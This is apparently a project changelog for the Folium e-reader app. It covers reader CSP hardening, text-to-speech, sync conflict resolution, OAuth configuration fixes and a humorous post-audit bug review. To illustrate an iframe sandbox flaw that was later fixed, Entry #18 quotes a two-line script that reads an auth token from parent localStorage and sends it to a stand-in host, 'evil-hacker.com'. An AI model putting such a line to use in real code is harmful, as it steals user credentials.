  - Inlined `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline' blob:; worker-src blob:; style-src 'unsafe-inline'; img-src blob: data:; font-src blob: data:; connect-src 'none';">` in both `epubViewerHtml.ts` and `pdfViewerHtml.ts`.
  - `connect-src 'none'` permanently eliminates network egress (`fetch`, `XHR`, `WebSocket`), neutralizing CSS exfiltration attacks.
  - Added `sandbox: 'allow-scripts allow-same-origin'` to `PdfReader.tsx` web iframe container (matching `EpubReader.tsx`).
- **W3C SVG Security Isolation**:
  - Strips `<script>` tags and active `on*` event handlers from all SVG elements upon document load in the EPUB reader engine.
- **Bug Fix**:
  - Resolved malformed `<!DOCTYPE \n if (payload.highlights...` in `epubViewerHtml.ts` and restored highlight initialization upon book render.

#### 4. Automated Security Verification Suite (`tests/security/storage_armor.test.mjs`)
- Added 14 new automated security and regression tests:
  - Rejection of corrupt or trailer-less PDFs.
  - Rejection of disguised PE binaries, ELF binaries, shell scripts.
  - OCF-compliant EPUB validation & rejection of non-OCF zips.
  - Zip bomb rejection (excessive entries, excessive uncompressed size, excessive ratio).
  - Reader CSP and iframe sandbox enforcement audit.
- **Verification Metrics**:
  - `pnpm typecheck`: 0 errors across 3 packages.
  - `pnpm test`: 35/35 passing (0 failing).
  - `npx expo export --platform web`: 9/9 static routes bundled successfully.

---

### Entry #14 (2026-10-02): Phase 10 Audio Narration (TTS) & Accessibility

#### Summary & Motivation
Implemented Phase 10 of the Folium roadmap, introducing cross-platform Text-to-Speech (TTS) audio narration across Web and Native Mobile without incurring any external cloud server costs ($0 operating cost) or bloating the application bundle (0 KB bundle penalty). Built smart voice selection in Settings, synchronized reader playback controls via `TTSPlayerBar`, and fortified sentence chunking with Vietnamese honorific protection.

#### 1. Zero-Cost, Zero-Bundle Engine Architecture (`ttsService.ts`, `useTTS.ts`)
- **Native OS & Web Speech API Synthesis**:
  - Web: Uses `window.speechSynthesis` and `SpeechSynthesisUtterance` with an active 10-second heartbeat keepalive defense against Chromium's 15-second playback timeout bug.
  - Mobile: Integrated with `expo-speech` delegating synthesis directly to on-device OS engines (Google Speech Services on Android, AVFoundation on iOS).
  - Preserved 100% offline autonomy and 0 KB network latency.
- **Smart Sentence Chunking & Casing Preservation**:
  - Implemented `splitTextIntoSentences()` with regex protection for honorifics and title prefixes (`BS.`, `ThS.`, `TP.`, `TS.`, `GS.`, `Mr.`, `Dr.`), decimal numbers (`3.14`), and dialogue quotes (`"..."`, `“...”`).
  - Preserves exact original character casing (`BS.`, `TP.`) through non-destructive marker tokenization.
- **Stateful React Hook (`useTTS.ts`)**:
  - Manages playback lifecycle (`play`, `pause`, `resume`, `stop`, `nextSentence`, `prevSentence`, `seekSentence`).
  - Persists user preferences (`voiceURI`, `rate`, `pitch`, `autoNext`) directly into SQLite `sync_meta` under key `tts_settings`.

#### 2. User-Centric Voice Selection & Settings (`settings.tsx`)
- Added **Voice & Narration** (`settings.ttsSection`) section to the main Settings screen:
  - Interactive Voice Picker Modal grouping recommended voices matching the active app language (`vi` -> Vietnamese voices first) followed by other system voices.
  - One-tap audio sample test button (`testVoice`) allowing users to preview pronunciation before choosing.
  - Playback speed chips (`0.75x`, `1.0x`, `1.25x`, `1.5x`, `1.75x`, `2.0x`).
  - Auto-advance sentence toggle switch.

#### 3. Reader Bridge & Synchronized Playback UI (`reader/[id].tsx`, `TTSPlayerBar.tsx`)
- **Bidirectional Text Extraction**:
  - Added `GET_CURRENT_TEXT` message protocol to both `epubViewerHtml.ts` and `pdfViewerHtml.ts`.
  - EPUB: Extracts live chapter DOM inner text via `rendition.getContents()`.
  - PDF: Queries `pdfjsLib` current page text content stream.
  - Exposed `onTextExtracted` and `getCurrentText()` across `EpubReader.tsx` and `PdfReader.tsx`.
- **Floating `TTSPlayerBar`**:
  - Top header displaying live status, sentence counter `(current/total)`, and speed rate cycler.
  - Sentence quote preview card rendering the sentence currently being spoken.
  - Transport controls (Previous sentence, Play/Pause circle, Next sentence, Close).
  - Integrated with text selection: selecting any paragraph or sentence in the reader and opening TTS instantly speaks the chosen passage.

#### 4. Internationalization & Quality Gates
- **i18n Localization**:
  - Complete translations for all TTS keys across all 7 supported languages (`vi`, `en`, `ja`, `zh`, `fr`, `es`, `de`).
- **Test Metrics (`tests/security/tts.test.mjs`)**:
  - Added 6 automated tests validating Vietnamese sentence splitting, abbreviation protection, HTML tag stripping, and language-aware voice prioritization.
  - Total automated test count increased to **41/41 passing** (0 failing).
  - `pnpm typecheck`: **0 errors** across monorepo.
  - `npx expo export --platform web`: All 9 static routes cleanly bundled with zero warnings.

---

### Entry #15 (2026-10-05): Sync Engine Hardening, Comprehensive LWW Conflict Resolution & Stale Client Invalidation

#### Summary & Motivation
Following an adversarial code review of Folium's synchronization pipeline, several critical distributed edge edge-cases were identified:
1. **Push-Before-Pull Race Condition**: In multi-device setups, pushing mutations prior to pulling updates caused the local sequence cursor to advance prematurely (`since = committedSeq`), inadvertently skipping intermediate sequences written by other devices while the client was offline.
2. **Conflict Resolution Asymmetry**: True timestamp-guarded Last-Write-Wins (LWW) was implemented strictly on `reading_progress`, while `bookmarks`, `highlights`, and `notes` defaulted to Last-Arrival-Wins on Cloudflare D1 without timestamp guard clauses.
3. **Stale Client Tombstone Purge Vulnerability**: After the 30-day tombstone retention period, purged records disappeared from the remote database without tracking a tombstone garbage collection watermark, allowing long-offline clients to potentially resurrect permanently deleted entities upon resynchronization.
4. **Zero-Knowledge Scope Boundary**: Clarified the boundary between local Zero-Knowledge AES-GCM-256 vault benchmarks and the structured TLS-in-transit edge synchronization pipeline.

#### 1. Inverted Sync Pipeline & Contiguous Sequence Gap Detection (`syncService.ts`)
- **Inverted Execution Order (`performFullSync`)**:
  - Reordered the synchronization workflow: `pullRemoteChanges()` is now invoked **before** `pushPendingMutations()`.
  - Ensures the local SQLite database always ingests and reconciles remote mutations from peer devices prior to committing new local mutations to the server.
- **Contiguous Advance & Dynamic Gap Detection (`pushPendingMutations`)**:
  - Replaced naive cursor advancement (`committedSeq > currentCursor`) with strict contiguous checking (`committedSeq === currentCursor + 1`).
  - If a sequence gap is detected (`committedSeq > currentCursor + 1` caused by concurrent writes during push preparation), the client prevents cursor jumping and immediately fires an intervening `pullRemoteChanges()` to bridge the sequence gap and prevent data loss.

#### 2. Universal Last-Write-Wins (LWW) Resolution (`packages/worker/src/index.ts`, `syncService.ts`)
- **Cloudflare D1 Mutation Hardening**:
  - Augmented `ON CONFLICT(id) DO UPDATE SET` clauses on `bookmarks`, `highlights`, and `notes` with strict timestamp predicates:
    ```sql
    WHERE table.user_id = excluded.user_id
      AND excluded.client_created_at >= table.client_created_at
    ```
  - Ensures older mutations arriving out-of-order cannot overwrite newer annotations. Equal timestamps cleanly resolve in favor of incoming changes (`>=`).
- **Client-Side SQLite Alignment**:
  - Replicated identical LWW timestamp guard checks on local mobile SQLite upserts within `pullRemoteChanges()`, ensuring offline edits made locally are not clobbered by stale remote state.

#### 3. GC Watermark & Stale Cursor Invalidation (`0003_gc_watermark.sql`, `packages/worker/src/index.ts`)
- **D1 Migration 0003 (`user_sync_sequence`)**:
  - Added `gc_watermark_seq INTEGER NOT NULL DEFAULT 0` column to track the maximum sequence up to which tombstones have been purged.
- **Automatic Watermark Advancement**:
  - During both automatic 30-day GC runs in the push cycle and explicit maintenance calls (`POST /api/sync/gc`), the server computes the maximum `sync_seq` among tombstones being purged and updates `gc_watermark_seq`.
- **HTTP 410 Gone Defense (`/api/sync/pull`)**:
  - If a client requests incremental changes with `since > 0 && since < gc_watermark_seq`, the server returns `HTTP 410 Gone` with code `CURSOR_EXPIRED`.
  - Client automatically resets `sync_cursor = 0` upon receiving HTTP 410 and requests a clean full resync (`since = 0`), preventing zombie record resurrection.

#### 4. Pull Snapshot Consistency Invariant (`packages/worker/src/index.ts`)
- **Torn Read Defense via Strict Snapshot Boundaries**:
  - Bound all 5 entity SELECT queries in `GET /api/sync/pull` with an explicit upper-bound sequence: `WHERE user_id = ? AND sync_seq > ? AND sync_seq <= ?` matching `snapshotSeq = currentServerSeq`.
  - Guarantees strict snapshot isolation: `since < record.sync_seq <= snapshotSeq`.
  - Mid-flight concurrent writes committed at `sync_seq > snapshotSeq` during pull query execution are cleanly quarantined for the subsequent pull, completely eliminating torn reads between entity tables.

#### 5. In-Batch Atomic Sequence Allocation & D1 Single-Transaction Atomicity
- **Elimination of Pre-Transaction JS Memory Sequence Race**:
  - Replaced pre-transaction `SELECT current_seq` with atomic database-driven sequence allocation inside the batch.
  - Statement 0 increments `user_sync_sequence` and returns `RETURNING current_seq`.
  - Entity mutation statements (books, reading_progress, bookmarks, highlights, notes) reference the freshly incremented sequence via correlated subqueries:
    ```sql
    INSERT INTO highlights (..., sync_seq)
    VALUES (..., (SELECT current_seq FROM user_sync_sequence WHERE user_id = ?))
    ```
  - Completely eliminates sequence collisions and ghost gaps between concurrent worker isolates executing simultaneous pushes.
- **Single-Transaction Headroom Cap (`MAX_PUSH_ITEMS = 90`)**:
  - Enforced `MAX_PUSH_ITEMS = 90` payload validation in `POST /api/sync/push`, ensuring total batch statements ($1\text{ seq} + \le 90\text{ items} + 5\text{ GC} + 1\text{ watermark} = 97$) never exceed D1's 100-statement transaction limit.

#### 6. Architecture Boundary & Comprehensive Stress Testing
- **Documentation & Scope Alignment**:
  - Updated `cryptoService.ts` module documentation detailing the cryptographic boundary between Phase 8 TLS-in-transit sync and Phase 9 End-to-End Envelope sync.
- **Automated Test Suite Expansion (`sync_engine_lww.test.mjs`, `sync_integration_stress.test.mjs`)**:
  - Added 10 automated test cases across two test suites:
    1. LWW rejection of older timestamps and acceptance of newer timestamps on SQLite.
    2. Contiguous cursor gap detection and dynamic pull invocation.
    3. Stale client cursor rejection via HTTP 410 GC watermark.
    4. Pull Snapshot Consistency under concurrent mid-flight writes.
    5. Real end-to-end gap recovery lifecycle in local SQLite (B writes seq 11, A pushes seq 12, gap detected, pulls both, applies local, cursor=12).
    6. 50 serialized transactional pushes simulation with `sql.js` (Sequence Continuity & Convergence).
    7. Stale client 410 full resync convergence lifecycle.
    8. Exact boundary validation for `MAX_PUSH_ITEMS = 90` (90 accepted, 91 rejected with `PAYLOAD_TOO_LARGE`).
    9. In-batch atomic sequence allocation preventing pre-transaction memory races.
  - Test suite expanded to **51/51 passing** tests (100% pass rate).
  - TypeScript typecheck: **0 errors** across all monorepo packages.

---

### Entry #16 (2026-10-05): Decoupling Google Drive Authentication from Dev Mode & Dynamic OAuth Client Configuration

#### Summary & Problem Analysis
During UI and user journey testing of the Google Drive integration, a critical UX and functional defect was identified:
1. **Silent Fallback to Dev Mode**: In `apps/mobile/src/services/authService.ts`, the condition `if (!clientId || demoFallback)` automatically fell back to `demoUser` (`Folium Reader (Dev Mode)`) with a mocked token (`demo_access_token_folium_sandbox`) whenever `clientId` was undefined in the environment.
2. **Broken Google Drive Sync**: Clicking the primary "Đăng nhập với Google" button hijacked the user into Dev Mode without notifying them of missing OAuth credentials. When the user subsequently attempted to sync with Google Drive, requests to official Google APIs (`https://www.googleapis.com/drive/v3/...`) inevitably failed with `401 Unauthorized` due to the dummy token.
3. **Configuration Inflexibility**: Web and mobile builds lacked an interactive mechanism to configure or update the Google OAuth Client ID at runtime, requiring complete rebuilds to change credentials.
4. **UX Ambiguity**: Users had no visual indication that their active session was simulated in Dev Mode rather than connected to real Google Cloud services.

#### 1. Decoupling OAuth Flow & Explicit Failure Guarantees (`authService.ts`)
- **Strict Separation of Sandbox vs. Production OAuth**:
  - `signInWithGoogle(demoFallback)` now strictly gates the sandbox fallback on `demoFallback === true`.
  - When the primary sign-in action is invoked (`demoFallback === false`) without a configured Client ID, the service throws an explicit, actionable error guiding the user instead of silently fabricating an in-memory session.
- **Environment-Driven Client ID Resolver**:
  - Implemented clean `getGoogleClientId()`: resolves environment variables (`EXPO_PUBLIC_GOOGLE_CLIENT_ID`, `EXPO_PUBLIC_GOOGLE_WEB_CLIENT_ID`, `EXPO_PUBLIC_GOOGLE_MOBILE_CLIENT_ID`).
  - Differentiated missing-configuration errors: provides actionable guidance in development (`__DEV__`) while advising end users to contact deployment administrators in production.
- **Enhanced OAuth Error Reporting**:
  - Improved error extraction from `AuthSession.promptAsync()` to extract specific `error_description` or `error` query parameters rather than vague `result.type` strings.

#### 2. Streamlined Drive Sync Modal UX (`DriveSyncModal.tsx`)
- **Zero-Clutter Consumer UI**:
  - Eliminated developer-facing OAuth configuration forms from the modal. End users are presented with a clean, single-action "Đăng nhập với Google" button.
  - Client ID configuration is enforced through environment variables (`EXPO_PUBLIC_GOOGLE_CLIENT_ID` in `.env` or CI/CD secrets), adhering to commercial app UX standards.
- **Visual Sandbox Indicator**:
  - Added an amber alert banner when an active session possesses a `demo_` token prefix, explicitly warning: `🛠️ Đang ở chế độ Sandbox (Dev Mode) — Sách được lưu trữ giả lập cục bộ...`.
- **Strict __DEV__ Sandbox Isolation**:
  - Guarded both the Sandbox UI button and `signInWithGoogle(true)` with `__DEV__` conditions. In production builds, the sandbox button is completely eliminated by the bundler, preventing any user tampering.

#### 3. Verification & Quality Gates
- `pnpm -r exec tsc --noEmit`: **0 errors** across monorepo.
- `pnpm test`: **51/51 tests passing** (100% green).

---

### Entry #17 (2026-10-06): The Hall of Shame: Paranoid CI Secrets & Tryhard PKCE (Hotfixes #15 & #16)

#### 1. Hotfix #15: The Secret That Was Too Secret For Its Own Runner
* **Expectation:** Created `EXPO_PUBLIC_GOOGLE_CLIENT_ID` in GitHub Repository Secrets. Felt like a cybersecurity mastermind. Expected production to just work.
* **Production Reality:** *"Google Client ID chưa được cấu hình cho ứng dụng. Vui lòng liên hệ quản trị viên của deployment này."* The irony? The person staring at the error *was* the administrator.
* **The Absurdity:**
  * GitHub Actions operates on galactic-tier paranoia. It locks secrets in a titanium vault, but when executing a `run:` step, it refuses to hand over the key unless explicitly bribed with an `env:` block.
  * Metro Bundler didn't even bother raising an eyebrow. It looked at the empty shell environment, shrugged, and hardcoded `undefined` straight into the JavaScript bundle.
  * Inspecting production's minified bundle felt like a bad joke:
    ```javascript
    function h() { const e = void 0; return e?.trim() || null; }
    ```
    Peak engineering: deploying a function painstakingly compiled to always return `null`.
* **The Fix:** Donated two lines of `env:` in `.github/workflows/deploy.yml` so GitHub Actions would finally stop hoarding its own secrets.

#### 2. Hotfix #16: When expo-auth-session Tried Too Hard and Got Slapped with Error 400
* **Expectation:** PR #15 landed, Client ID finally materialized on production, Google OAuth popup opened. Cue celebration.
* **Production Reality:** Google immediately slammed the door shut with a pitch-black screen:
  > **Error 400: invalid_request**  
  > *Parameter not allowed for this message type: code_challenge_method*
* **The Absurdity:**
  * `expo-auth-session` suffers from chronic overachiever syndrome.
  * Folium uses an OpenID Connect Implicit flow (`response_type=token id_token`) so client SPAs can receive tokens directly without dragging an entire backend proxy into the mix.
  * But `expo-auth-session` decided: *"It's 2026, everybody MUST use PKCE!"* Without anyone asking, it defaulted `usePKCE: true` and proudly slapped `code_challenge_method=S256` onto our URL query.
  * Google's OAuth server looked at the request and went: *"Who asked for PKCE on an implicit token request? RFC 7636 says no. Get out."*
* **The Fix:** Literally one line:
  ```typescript
  usePKCE: false,
  ```
  Code written exclusively to tell the library: *"Calm down, nobody asked for your unsolicited security enthusiasm."*

#### Lessons Learned
1. Storing secrets in GitHub UI without an `env:` block in YAML is like buying a bank vault and throwing the key into the ocean.
2. Libraries that default to "extra helpful security" are actively trying to get you Error 400'd.
3. When debugging production builds, trust no one except the minified `.js`: `void 0` never lies.

---

### Entry #18 (2026-10-06): The Post-Audit Reality Check: Zombie Books, Amnesiac Caches, and the Sandbox That Wasn't (PR #17)

#### Summary & Post-Audit Revelations
Fresh off the high of "fixing" OAuth with one line of code in PR #16, a comprehensive audit of `main` revealed that while we were busy arguing about OAuth flows, the rest of the application was happily breaking fundamental laws of distributed systems and browser security.

#### 1. The Sandbox That Left the Front Door Wide Open
* **The Grand Illusion:** We had spent weeks bragging about "Phase 8.8 Storage Armor," writing 500 lines of regex firewalls, zero-exfiltration CSP rules, zip-bomb decompression ratio checkers, and SVG script quarantines. We felt like digital NSA architects.
* **The Reality Check:** The iframe sandbox in `EpubReader.tsx` and `PdfReader.tsx` was configured as:
  ```tsx
  sandbox="allow-scripts allow-same-origin"
  ```
* **The Punchline:** In browser security 101, `allow-scripts allow-same-origin` on an iframe inside a static SPA literally means: *"This iframe shares full document origin with the parent window."* Any downloaded public domain EPUB or malicious PDF containing a tiny `<script>` tag could casually execute:
  ```javascript
  const token = parent.localStorage.getItem('FOLIUM_AUTH_USER');
  fetch('https://evil-hacker.com/steal?token=' + token);
  ```
  All that fortress-grade CSP armor, and the front door was held open with a brick.
* **The Fix:** Stripped `allow-same-origin` down to pure `sandbox="allow-scripts"`. The iframe is now exiled to an opaque `null` origin where parent `localStorage` is mathematically unreachable, and bridge communication is restricted to strictly typed `postMessage`.

#### 2. The 410 "Reset Cursor and Pray" Protocol Disaster
* **The Grand Illusion:** We designed an elaborate 30-day tombstone garbage collection watermark on Cloudflare Worker. If a client disappeared for 30 days and came back with a stale cursor, the Worker returned `HTTP 410 Gone (CURSOR_EXPIRED)`. Very fancy. Very distributed systems.
* **The Punchline:** Here is how the client handled `410`:
  ```typescript
  setLastSyncedSeq(0);
  return pullRemoteChanges();
  ```
  That was it. The client literally set its cursor to `0`, pulled all remaining server rows, and didn't touch anything else.
  * Server deleted Book A at `seq=10`.
  * GC ran at `seq=50`, purging Book A's tombstone.
  * Client connected with `cursor=5`.
  * Worker sent `410`.
  * Client pulled server records from `0`. Since Book A's tombstone was gone, the server never told the client Book A was deleted.
  * Result: Book A remained on the client forever. An automated garbage collection mechanism that actively prevented garbage from being collected.
* **The Fix:** Implemented active snapshot reconciliation on `410`: when an expired cursor triggers a full resync, local database state is diffed against the server snapshot, safely pruning records that were GC'd on the cloud while preserving unpushed mutations in the local outbox.

#### 3. Zombie Books: Who Needs Timestamps Anyway?
* **The Grand Illusion:** We spent days refining Last-Write-Wins (LWW) conflict resolution with millisecond timestamps across bookmarks, highlights, and reading progress.
* **The Punchline:** Someone forgot the most important table: `books`.
  * In the Worker's `POST /api/sync/push`:
    ```sql
    ON CONFLICT(id) DO UPDATE SET title = excluded.title, is_deleted = excluded.is_deleted...
    ```
    There was no `WHERE excluded.updated_at >= books.updated_at`. Zero timestamp validation.
  * If Device A went offline, edited a title at $T=100$, and Device B deleted the book at $T=200$, Device A would reconnect at $T=300$, push its stale update, and the server would cheerfully resurrect the book by setting `is_deleted = 0`.
  * SQLite on the client had the exact same amnesia: remote book deletions were executed with unconditional `DELETE FROM books WHERE id = ?`.
* **The Fix:** Added `client_updated_at` to Cloudflare D1 schema (`0004_book_lww.sql`), updated `@folium/shared`, and added strict timestamp comparison guards on both server D1 and client SQLite.

#### 4. Multi-User Amnesia: "All Your Folders Belong to User A"
* **The Punchline:** In `googleDriveService.ts`:
  ```typescript
  let cachedFolderId: string | null = null;
  ```
  User A logs in -> Folium folder created -> `cachedFolderId = "folder_A"`.
  User A logs out. User B logs in on the same browser.
  `getOrCreateFoliumFolder()` checks `cachedFolderId`: *"Oh look, I already have a folder ID!"* and attempts to sync User B's library into User A's Google Drive. Google APIs promptly returned 404/403, baffling everyone involved.
* **The Fix:** Scoped the cache to `{ userId, folderId }`, and wired `clearGoogleDriveCache()` and `resetSyncSessionState()` directly into `authService.signOut()`.

#### 5. Verification
* Typecheck across all monorepo packages: **0 errors**.
* Security & Distributed Test Suite: **53/53 passing** (including new automated regression tests for LWW zombie book defense and 410 GC watermark reconciliation).
* CI: Added `pnpm test` as a mandatory blocking gate in `.github/workflows/deploy.yml`.


